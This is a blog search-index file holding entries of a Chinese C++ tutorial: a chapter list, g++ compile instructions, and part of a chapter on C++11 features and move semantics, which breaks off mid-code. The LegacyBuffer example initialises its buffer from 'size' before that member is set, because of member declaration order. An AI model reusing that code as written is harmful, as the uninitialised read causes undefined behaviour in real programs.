<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C++ Tutorial</title>
      <link href="2025/05/01/Cpp_tutorial_all/"/>
      <url>2025/05/01/Cpp_tutorial_all/</url>
      
        <content type="html"><![CDATA[<h1 id="C-Tutorial-目录"><a href="#C-Tutorial-目录" class="headerlink" title="C++ Tutorial 目录"></a>C++ Tutorial 目录</h1><ul><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_1/">Chapter 1 C++ Tutorial 简介</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_2/">Chapter 2 开始学习C++</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_3/">Chapter 3 处理数据</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_4/">Chapter 4 复合类型</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_5/">Chapter 5 循环和关系表达式</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_6/">Chapter 6 分支语句和逻辑运算符</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_7/">Chapter 7 函数——C++的编程模块</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_8/">Chapter 8 函数进阶</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_9/">Chapter 9 内存模型和名称空间</a></li><li><a href="http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_10/">Chapter 10 对象和类</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_11/">Chapter 11 使用类</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_12/">Chapter 12 类和动态内存分配</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_13/">Chapter 13 类继承</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_14/">Chapter 14 C++中的代码重用</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_15/">Chapter 15 友元、异常和其他</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_16/">Chapter 16 string 类和标准模板库</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_17/">Chapter 17 输入、输出和文件</a></li><li><a href="http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_18/">Chapter 18 探讨C++新标准</a></li></ul><hr><p>文章未经许可禁止转载。如有问题请发送邮件至<code>xsran12138@163.com</code>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 1 C++ Tutorial 简介</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_1/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_1/</url>
      
        <content type="html"><![CDATA[<p>本系列是参考《C++ Primer Plus》目录进行编写的精简版教程。</p><p>由于是精简版，因此可能不能完全覆盖原版《C++ Primer Plus》的所有内容，但是在篇幅上大大减少，只能说有利有弊吧。</p><p>对于编写代码的环境，个人建议是使用wsl2（推荐）或者VMWare等虚拟机环境中Linux自带的g++编译器（使用mingw等编译工具有可能会出现各种奇奇怪怪的错误），常见的编译命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ test.cpp -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>编译完成后，执行命令<code>./test</code>即可运行编译后的程序。</p><p>当然，也可以省略<code>-o test</code>，直接使用<code>g++ test.cpp</code>编译，编译完成后会生成一个默认的可执行文件<code>a.out</code>，执行命令<code>./a.out</code>即可运行编译后的程序。</p><hr><p>文章未经许可禁止转载。如有问题请发送邮件至<code>xsran12138@163.com</code>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 18 探讨C++新标准</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_18/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_18/</url>
      
        <content type="html"><![CDATA[<h2 id="18-1-复习前面介绍过的C-11功能"><a href="#18-1-复习前面介绍过的C-11功能" class="headerlink" title="18.1 复习前面介绍过的C++11功能"></a>18.1 复习前面介绍过的C++11功能</h2><p>C++11 标准为 C++ 语言带来了许多重要的改进和新特性，旨在提高语言的效率、安全性和易用性。在前面的章节中，我们已经接触并使用了其中的一些功能。本节将对这些已介绍的 C++11 特性进行一个简要的回顾。</p><h3 id="18-1-1-新类型"><a href="#18-1-1-新类型" class="headerlink" title="18.1.1 新类型"></a>18.1.1 新类型</h3><p>C++11 引入了几种新的基本类型：</p><ul><li><strong><code>long long</code> 和 <code>unsigned long long</code>:</strong> （第 3 章）提供了至少 64 位的整数类型，用于表示比 <code>long</code> 更大范围的整数。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> large_num = <span class="number">9876543210123L</span>L;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> very_large_positive = <span class="number">18446744073709551615U</span>LL;</span><br></pre></td></tr></table></figure></li><li><strong><code>char16_t</code> 和 <code>char32_t</code>:</strong> （第 3 章, 第 16 章）用于显式支持 UTF-16 和 UTF-32 编码的字符。分别使用 <code>u</code> 和 <code>U</code> 前缀表示对应的字符和字符串字面量。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char16_t</span> utf16_char = <span class="string">u&#x27;Ω&#x27;</span>;</span><br><span class="line">char32_t utf32_char = U&#x27;🌍&#x27;;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char16_t</span>* utf16_str = <span class="string">u&quot;你好&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char32_t</span>* utf32_str = <span class="string">U&quot;世界&quot;</span>;</span><br></pre></td></tr></table></figure></li><li><strong><code>nullptr</code>:</strong> （第 4 章）引入了新的空指针常量 <code>nullptr</code>，用于替代之前使用的 <code>0</code> 或 <code>NULL</code>。<code>nullptr</code> 具有明确的指针类型 (<code>std::nullptr_t</code>)，可以避免一些与 <code>0</code> (整数) 相关的歧义。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>* ptr1 = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">void</span> (*func_ptr)(<span class="keyword">int</span>) = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="comment">// if (ptr1 == 0) &#123; /* ... */ &#125; // 旧式比较</span></span><br><span class="line"><span class="keyword">if</span> (ptr1 == <span class="literal">nullptr</span>) &#123; <span class="comment">/* ... */</span> &#125; <span class="comment">// C++11 推荐</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="18-1-2-统一的初始化"><a href="#18-1-2-统一的初始化" class="headerlink" title="18.1.2 统一的初始化"></a>18.1.2 统一的初始化</h3><p>C++11 推广了使用<strong>花括号 <code>&#123;&#125;</code></strong> 进行初始化的方式，称为<strong>统一初始化 (Uniform Initialization)</strong> 或列表初始化 (List Initialization)。这种方式可以用于多种初始化场景，并有助于防止窄化转换 (Narrowing Conversion)。</p><ul><li><strong>基本类型:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x&#123;<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">double</span> pi&#123;<span class="number">3.14</span>&#125;;</span><br><span class="line"><span class="comment">// int narrow_error&#123;3.14&#125;; // 编译错误！防止 double 到 int 的窄化</span></span><br></pre></td></tr></table></figure></li><li><strong>数组:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> arr[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;; <span class="comment">// 大小自动推断</span></span><br></pre></td></tr></table></figure></li><li><strong>结构和类:</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Point</span> &#123;</span> <span class="keyword">int</span> x, y; &#125;;</span><br><span class="line">Point p&#123;<span class="number">10</span>, <span class="number">20</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> s&#123;<span class="string">&quot;Hello&quot;</span>&#125;;</span><br></pre></td></tr></table></figure></li><li><strong>STL 容器 (通过 <code>initializer_list</code>):</strong> （第 16 章）  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">int</span>&gt; m &#123;&#123;<span class="string">&quot;one&quot;</span>, <span class="number">1</span>&#125;, &#123;<span class="string">&quot;two&quot;</span>, <span class="number">2</span>&#125;&#125;;</span><br></pre></td></tr></table></figure></li></ul><h3 id="18-1-3-声明"><a href="#18-1-3-声明" class="headerlink" title="18.1.3 声明"></a>18.1.3 声明</h3><p>C++11 引入了新的声明方式来简化类型书写和推断：</p><ul><li><strong><code>auto</code>:</strong> （第 3 章）让编译器根据变量的<strong>初始化表达式</strong>自动推断其类型。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> i = <span class="number">42</span>;        <span class="comment">// i 推断为 int</span></span><br><span class="line"><span class="keyword">auto</span> d = <span class="number">3.14</span>;      <span class="comment">// d 推断为 double</span></span><br><span class="line"><span class="keyword">auto</span> s = <span class="built_in">std</span>::<span class="built_in">string</span>(<span class="string">&quot;text&quot;</span>); <span class="comment">// s 推断为 std::string</span></span><br><span class="line"><span class="keyword">auto</span> it = v.begin(); <span class="comment">// it 推断为 std::vector&lt;int&gt;::iterator</span></span><br></pre></td></tr></table></figure></li><li><strong><code>decltype</code>:</strong> 根据<strong>表达式</strong>推断类型，但不计算该表达式。常用于泛型编程或需要根据已有变量或函数返回值确定类型的场景。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">decltype</span>(x) y = <span class="number">10</span>; <span class="comment">// y 的类型与 x 相同，为 int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">func</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">decltype</span>(func()) z; <span class="comment">// z 的类型是 func 的返回类型 double (不实际调用 func)</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="18-1-4-智能指针"><a href="#18-1-4-智能指针" class="headerlink" title="18.1.4 智能指针"></a>18.1.4 智能指针</h3><p>（第 16 章）C++11 在 <code>&lt;memory&gt;</code> 头文件中引入了现代智能指针，用于自动管理动态分配的内存，取代了容易出错的 <code>auto_ptr</code>。</p><ul><li>  <strong><code>std::unique_ptr&lt;T&gt;</code>:</strong> 独占所有权的智能指针，轻量级，不可复制，可移动。</li><li>  <strong><code>std::shared_ptr&lt;T&gt;</code>:</strong> 共享所有权的智能指针，通过引用计数管理对象生命周期。</li><li>  <strong><code>std::weak_ptr&lt;T&gt;</code>:</strong> 非拥有型指针，用于观察 <code>shared_ptr</code> 管理的对象，解决循环引用问题。</li></ul><h3 id="18-1-5-异常规范方面的修改"><a href="#18-1-5-异常规范方面的修改" class="headerlink" title="18.1.5 异常规范方面的修改"></a>18.1.5 异常规范方面的修改</h3><p>（第 15 章）C++11 引入了 <code>noexcept</code> 说明符和运算符，用于指示函数是否可能抛出异常。</p><ul><li><strong><code>noexcept</code> 说明符:</strong> 放在函数声明或定义后，表示该函数保证不抛出任何异常。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_data</span><span class="params">()</span> <span class="keyword">noexcept</span></span>; <span class="comment">// 声明保证不抛异常</span></span><br></pre></td></tr></table></figure>  这有助于编译器进行优化，并用于异常安全保证。析构函数默认是 <code>noexcept</code> 的。</li><li>  <strong><code>noexcept</code> 运算符:</strong> <code>noexcept(expression)</code>，在编译时判断表达式 <code>expression</code> 是否可能抛出异常，返回一个 <code>bool</code> 常量。</li></ul><p>旧的 <code>throw()</code> 异常规范在 C++11 中被废弃。</p><h3 id="18-1-6-作用域内枚举"><a href="#18-1-6-作用域内枚举" class="headerlink" title="18.1.6 作用域内枚举"></a>18.1.6 作用域内枚举</h3><p>（第 10 章）C++11 引入了<strong>强类型枚举 (Strongly-typed enums)</strong> 或**作用域内枚举 (Scoped enums)**，使用 <code>enum class</code> (或 <code>enum struct</code>) 关键字定义。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Color</span> &#123;</span> RED, GREEN, BLUE &#125;;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="keyword">class</span> <span class="title">Status</span> &#123;</span> OK, ERROR &#125;;</span><br><span class="line"></span><br><span class="line">Color c = Color::RED;</span><br><span class="line">Status s = Status::OK;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if (c == s) &#123;&#125; // 编译错误！不同类型的枚举不能直接比较</span></span><br><span class="line"><span class="comment">// int x = c;     // 编译错误！不能隐式转换为整数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (c == Color::GREEN) &#123; <span class="comment">/* ... */</span> &#125;</span><br></pre></td></tr></table></figure><p><strong>优点:</strong></p><ul><li>  <strong>强类型:</strong> 不同枚举类型的值不能隐式转换或直接比较。</li><li>  <strong>作用域:</strong> 枚举成员的作用域限定在枚举类型内部，必须通过 <code>EnumType::Member</code> 访问，避免了命名冲突。</li><li>  <strong>可指定底层类型:</strong> <code>enum class Color : char &#123; RED, GREEN, BLUE &#125;;</code></li></ul><h3 id="18-1-7-对类的修改"><a href="#18-1-7-对类的修改" class="headerlink" title="18.1.7 对类的修改"></a>18.1.7 对类的修改</h3><p>(本节主要回顾，但部分内容如委托/继承构造函数、override/final 在 18.3 详细介绍，这里仅提及概念)<br>C++11 对类定义和使用也进行了一些改进，部分已在前面章节涉及或将在后续章节详细介绍，例如：</p><ul><li>  <strong>默认构造函数和成员初始化:</strong> 允许在类定义中直接初始化非静态成员变量。</li><li>  <strong><code>= default</code> 和 <code>= delete</code>:</strong> 显式要求编译器生成默认的特殊成员函数（构造、析构、拷贝、移动）或禁用它们。</li><li>  <strong>委托构造函数:</strong> 一个构造函数可以调用同一类的另一个构造函数。</li><li>  <strong>继承构造函数:</strong> 派生类可以继承基类的构造函数。</li><li>  <strong><code>override</code> 和 <code>final</code>:</strong> 用于管理虚函数，<code>override</code> 确保派生类方法确实覆盖了基类虚函数，<code>final</code> 阻止派生类进一步覆盖虚函数或阻止类被继承。</li></ul><h3 id="18-1-8-模板和-STL-方面的修改"><a href="#18-1-8-模板和-STL-方面的修改" class="headerlink" title="18.1.8 模板和 STL 方面的修改"></a>18.1.8 模板和 STL 方面的修改</h3><p>C++11 对模板和标准库进行了大量增强：</p><ul><li><strong>基于范围的 <code>for</code> 循环:</strong> （第 5 章, 第 16 章）提供了简洁的遍历容器或序列的方式。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> x : v) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>  <strong><code>std::array</code>:</strong> （第 4 章, 第 16 章）提供了固定大小数组的模板类封装。</li><li>  <strong>无序关联容器:</strong> （第 16 章）引入了基于哈希表的 <code>unordered_set</code>, <code>unordered_map</code>, <code>unordered_multiset</code>, <code>unordered_multimap</code>。</li><li>  <strong><code>std::initializer_list</code>:</strong> （第 16 章）使得容器和其他类能够支持使用 <code>&#123;&#125;</code> 进行列表初始化。</li><li>  <strong>新的 STL 算法:</strong> 增加了一些新的算法（如 <code>copy_if</code>, <code>move</code>, <code>shuffle</code> 等）。</li><li>  <strong>Lambda 表达式:</strong> （第 16 章简单使用，第 18.4 节详细介绍）允许就地定义匿名函数对象。</li><li><strong>模板别名 (<code>using</code>):</strong> （第 14 章）提供了比 <code>typedef</code> 更清晰、更强大的为模板定义别名的方式。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">using</span> Vec = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;T&gt;; <span class="comment">// Vec&lt;int&gt; 等价于 std::vector&lt;int&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="18-1-9-右值引用"><a href="#18-1-9-右值引用" class="headerlink" title="18.1.9 右值引用"></a>18.1.9 右值引用</h3><p>(本节主要回顾，但右值引用和移动语义在 18.2 详细介绍，这里仅提及概念)<br>C++11 引入了一个重要的底层概念——<strong>右值引用 (Rvalue Reference)**，使用 <code>&amp;&amp;</code> 表示。右值引用主要用于实现</strong>移动语义 (Move Semantics)** 和**完美转发 (Perfect Forwarding)**。移动语义允许资源（如动态分配的内存）从一个对象“移动”到另一个对象，而不是进行昂贵的复制，这对于优化涉及临时对象或资源转移的操作至关重要（例如 <code>unique_ptr</code> 的所有权转移，<code>vector</code> 增长时的元素移动）。移动语义将在 18.2 节详细探讨。</p><p>这些 C++11 特性共同使得 C++ 代码可以写得更现代、更安全、更高效。</p><h2 id="18-2-移动语义和右值引用"><a href="#18-2-移动语义和右值引用" class="headerlink" title="18.2 移动语义和右值引用"></a>18.2 移动语义和右值引用</h2><p>C++11 引入了<strong>右值引用 (Rvalue Reference)</strong> 和**移动语义 (Move Semantics)**，这是 C++11 最重要的特性之一，旨在提高性能，特别是对于管理资源的类（如动态分配内存、文件句柄、网络连接等）。</p><h3 id="18-2-1-为何需要移动语义"><a href="#18-2-1-为何需要移动语义" class="headerlink" title="18.2.1 为何需要移动语义"></a>18.2.1 为何需要移动语义</h3><p>考虑一个管理动态内存的类，例如一个简单的字符串类或一个持有大缓冲区的类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt; // for strlen, strcpy</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utility&gt; // for std::swap</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LegacyBuffer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span>* buffer;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// Constructor</span></span><br><span class="line">    LegacyBuffer(<span class="keyword">const</span> <span class="keyword">char</span>* s = <span class="string">&quot;&quot;</span>) : size(<span class="built_in">std</span>::<span class="built_in">strlen</span>(s)), buffer(<span class="keyword">new</span> <span class="keyword">char</span>[size + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Constructor called for &#x27;&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(buffer, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destructor</span></span><br><span class="line">    ~LegacyBuffer() &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Destructor called for buffer at &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Constructor (Deep Copy)</span></span><br><span class="line">    LegacyBuffer(<span class="keyword">const</span> LegacyBuffer&amp; other) : size(other.size), buffer(<span class="keyword">new</span> <span class="keyword">char</span>[size + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Copy Constructor called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(buffer, other.buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Assignment Operator (Deep Copy)</span></span><br><span class="line">    LegacyBuffer&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> LegacyBuffer&amp; other) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Copy Assignment called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;other) &#123; <span class="comment">// Self-assignment check</span></span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">delete</span>[] buffer; <span class="comment">// Release old resource</span></span><br><span class="line">        size = other.size;</span><br><span class="line">        buffer = <span class="keyword">new</span> <span class="keyword">char</span>[size + <span class="number">1</span>]; <span class="comment">// Allocate new resource</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(buffer, other.buffer); <span class="comment">// Copy data</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer content: &quot;</span> &lt;&lt; (buffer ? buffer : <span class="string">&quot;null&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(LegacyBuffer&amp; first, LegacyBuffer&amp; second)</span> <span class="keyword">noexcept</span> </span>&#123;</span><br><span class="line">         <span class="keyword">using</span> <span class="built_in">std</span>::swap;</span><br><span class="line">         swap(first.size, second.size);</span><br><span class="line">         swap(first.buffer, second.buffer);</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer swapped via friend swap\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">LegacyBuffer <span class="title">createBuffer</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> LegacyBuffer(s); <span class="comment">// 返回一个临时对象 (rvalue)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 C++11 之前，当处理<strong>临时对象 (Temporary Objects)</strong> 或即将销毁的对象时，复制构造函数和复制赋值运算符会导致不必要的**深拷贝 (Deep Copy)**：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">LegacyBuffer <span class="title">b1</span><span class="params">(<span class="string">&quot;Original&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    LegacyBuffer b2 = b1; <span class="comment">// 调用复制构造函数 (深拷贝) - 合理，需要独立副本</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function">LegacyBuffer <span class="title">b3</span><span class="params">(<span class="string">&quot;Temporary Source&quot;</span>)</span></span>;</span><br><span class="line">    b1 = b3; <span class="comment">// 调用复制赋值运算符 (深拷贝) - 合理</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 问题所在：处理临时对象</span></span><br><span class="line">    LegacyBuffer b4 = createBuffer(<span class="string">&quot;Temporary&quot;</span>); <span class="comment">// 1. createBuffer 返回临时对象</span></span><br><span class="line">                                                 <span class="comment">// 2. 临时对象被 *复制* 到 b4 (调用复制构造函数)</span></span><br><span class="line">                                                 <span class="comment">// 3. 临时对象被销毁</span></span><br><span class="line">                                                 <span class="comment">// (编译器优化 RVO/NRVO 可能消除这次复制，但概念上存在)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    b1 = createBuffer(<span class="string">&quot;Another Temp&quot;</span>); <span class="comment">// 1. createBuffer 返回临时对象</span></span><br><span class="line">                                       <span class="comment">// 2. 临时对象被 *复制* 赋值给 b1 (调用复制赋值)</span></span><br><span class="line">                                       <span class="comment">// 3. 临时对象被销毁</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 